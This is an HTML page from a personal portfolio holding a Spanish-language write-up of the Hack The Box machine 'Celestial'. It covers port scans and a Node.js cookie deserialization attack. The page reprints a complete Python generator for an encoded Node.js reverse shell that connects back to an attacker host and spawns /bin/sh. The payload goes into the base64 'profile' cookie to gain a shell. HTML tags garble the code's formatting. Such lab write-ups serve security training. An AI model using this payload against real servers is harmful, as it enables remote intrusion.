@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Celestial | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../../../index.html#writeups" class="nav-link">← Writeups</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../../../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <div class="writeup-meta">
+        <span class="card-badge htb">HTB</span>
+        <span class="card-difficulty medium">MEDIUM</span>
+      </div>
+      <h1 class="writeup-title">Celestial</h1>
+      <div class="writeup-info">
+        <span>Plataforma: <strong style="color:var(--blue-bright)">Hack The Box</strong></span>
+        <span>Tags: <span>Node.js</span><span>Deserialization</span><span>Cron</span></span>
+      </div>
+    </div>
+    <div class="writeup-body">
+
+
+<h1>INTRUSION INICIAL</h1>
+
+<h2>Escaneo de puertos </h2>
+
+<p>comando: <code> nmap -sS -p- --open --min-rate 5000 -Pn -n $ip -oN nmap  </code></p>
+
+<pre><code>Host is up (1.6s latency).
+<p>Not shown: 65370 open|filtered udp ports (no-response), 43099 filtered tcp ports (no-response), 22435 closed tcp ports (conn-refused), 165 closed udp ports (port-unreach)</p>
+<p>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit</p>
+<p>PORT     STATE SERVICE</p>
+<p>3000/tcp open  ppp</p>
+
+<p>Nmap done: 1 IP address (1 host up) scanned in 441.49 seconds</code></pre></p>
+
+<p>comando: <code>nmap -sCV -p3000 $ip -oN nmap.txt</code></p>
+
+<pre><code>Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 13:27 EST
+<p>Nmap scan report for 10.129.228.94</p>
+<p>Host is up (0.089s latency).</p>
+
+<p>PORT     STATE SERVICE VERSION</p>
+<p>3000/tcp open  http    Node.js Express framework</p>
+<p>|_http-title: Site doesn't have a title (text/html; charset=utf-8).</p>
+
+<p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 15.30 seconds</code></pre></p>
+<p>vemos que es una pagina web con <strong>Node.js Express framework</strong></p>
+
+<hr>
+
+<h2>Explotación Web </h2>
+
+<h3>Fuzzing Web</h3>
+<p>no encontramos nada</p>
+
+<h3>Cookies </h3>
+
+<p>Viendo las Cookies vemos que el sitio web usa una <strong>cookie</strong> llamada <strong>profile</strong> y vemos que esta en base64 y cuando lo decodificamos es un objeto JSON en base64</p>
+
+<em>[imagen]</em>
+
+<p>podemos pensar que podemos abusar de <strong>deserilization attacks</strong> porque estamos enviando un objeto serializado y se supone que la web tiene que deserealizar después , buscando dimos con que para NodeJS hay una vuln que nos permite hacer esto:</p>
+
+<p>https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf</p>
+
+<pre><code>#!/usr/bin/python
+<h1>Generator for encoded NodeJS reverse shells</h1>
+<h1>Based on the NodeJS reverse shell by Evilpacket</h1>
+<h1>https://github.com/evilpacket/node-shells/blob/master/node_revshell.js</h1>
+<h1>Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)</h1>
+<h1>Insecurety Research (2013) - insecurety.net</h1>
+<p>import sys</p>
+
+<p>if len(sys.argv) != 3:</p>
+<p>print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])</p>
+<p>sys.exit(0)</p>
+
+<p>IP_ADDR = sys.argv[1]</p>
+<p>PORT = sys.argv[2]</p>
+
+
+<p>def charencode(string):</p>
+<p>"""String.CharCode"""</p>
+<p>encoded = ''</p>
+<p>for char in string:</p>
+<p>encoded = encoded + "," + str(ord(char))</p>
+<p>return encoded[1:]</p>
+
+<p>print "[+] LHOST = %s" % (IP_ADDR)</p>
+<p>print "[+] LPORT = %s" % (PORT)</p>
+<p>NODEJS_REV_SHELL = '''</p>
+<p>var net = require('net');</p>
+<p>var spawn = require('child_process').spawn;</p>
+<p>HOST="%s";</p>
+<p>PORT="%s";</p>
+<p>TIMEOUT="5000";</p>
+<p>if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }</p>
+<p>function c(HOST,PORT) {</p>
+<p>var client = new net.Socket();</p>
+<p>client.connect(PORT, HOST, function() {</p>
+<p>var sh = spawn('/bin/sh',[]);</p>
+<p>client.write("Connected!\\n");</p>
+<p>client.pipe(sh.stdin);</p>
+<p>sh.stdout.pipe(client);</p>
+<p>sh.stderr.pipe(client);</p>
+<p>sh.on('exit',function(code,signal){</p>
+<p>client.end("Disconnected!\\n");</p>
+<p>});</p>
+<p>});</p>
+<p>client.on('error', function(e) {</p>
+<p>setTimeout(c(HOST,PORT), TIMEOUT);</p>
+<p>});</p>
+<p>}</p>
+<p>c(HOST,PORT);</p>
+<p>''' % (IP_ADDR, PORT)</p>
+<p>print "[+] Encoding"</p>
+<p>PAYLOAD = charencode(NODEJS_REV_SHELL)</p>
+
+<p>print "eval(String.fromCharCode(%s))" % (PAYLOAD)</code></pre></p>
+<p>usamos este exploit para generar un payload</p>
+<em>[imagen]</em>
+
+<p>introducimos eso como payload en el objeto que luego convertiremos a base64:</p>
+
+<em>[imagen]</em>enviamos este objeto en base64 al servidor como cookie y obtenemos una revershell
+
+
+<hr>
+<p>\</p>
+
+    </div>
+  </div>
+</body>
+</html>
